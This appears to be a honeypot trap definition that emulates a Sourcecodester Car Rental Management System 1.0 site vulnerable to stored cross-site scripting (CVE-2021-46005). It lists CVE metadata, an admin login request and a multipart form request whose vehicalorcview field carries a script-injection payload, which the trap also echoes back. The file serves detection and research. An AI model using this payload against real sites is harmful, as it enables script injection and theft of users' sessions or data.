id: CVE-2021-46005
info:
  name: Sourcecodester Car Rental Management System 1.0 - Stored Cross-Site Scripting
  author: cckuailong
  description: Sourcecodester Car Rental Management System 1.0 is vulnerable to cross-site
    scripting via the vehicalorcview parameter.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into the application, leading to the execution of arbitrary
    code or theft of sensitive information.

    '
  remediation: 'To remediate this issue, it is recommended to implement proper input
    validation and sanitization techniques to prevent the execution of malicious scripts.

    '
  reference:
  - https://www.exploit-db.com/exploits/49546
  - https://nvd.nist.gov/vuln/detail/CVE-2021-46005
  - https://www.sourcecodester.com/cc/14145/online-car-rental-system-using-phpmysql.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2021-46005
    cwe-id: CWE-79
    epss-score: 0.00143
    epss-percentile: 0.50055
    cpe: cpe:2.3:a:car_rental_management_system_project:car_rental_management_system:1.0:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: car_rental_management_system_project
    product: car_rental_management_system
  tags: cve2021,cve,sourcecodester,authenticated,edb,xss,intrusive,car_rental_management_system_project
traps:
- request:
    method: POST
    path: /admin/
    headers:
      Content-Type: application/x-www-form-urlencoded
      Connection: close
    body: 'username={{username}}&password={{password}}&login=

      '
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: </script><script>alert(document.domain)</script>
- request:
    method: POST
    path: /admin/post-avehical.php
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypWqYipqU21aYgccv
    body: |
      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="vehicletitle"

      Test
      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="brandname"

      1
      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="vehicalorcview"

      </script><script>alert(document.domain)</script>
      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="priceperday"

      500
      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="fueltype"

      Petrol
      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="modelyear"

      2022
      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="seatingcapacity"

      5
      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="img1"; filename="test.png"
      Content-Type: image/png


      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="img2"; filename="test.png"
      Content-Type: image/png


      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="img3"; filename="test.png"
      Content-Type: image/png


      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="img4"; filename="test.png"
      Content-Type: image/png


      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="img5"; filename=""
      Content-Type: application/octet-stream


      ------WebKitFormBoundarypWqYipqU21aYgccv
      Content-Disposition: form-data; name="submit"


      ------WebKitFormBoundarypWqYipqU21aYgccv--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
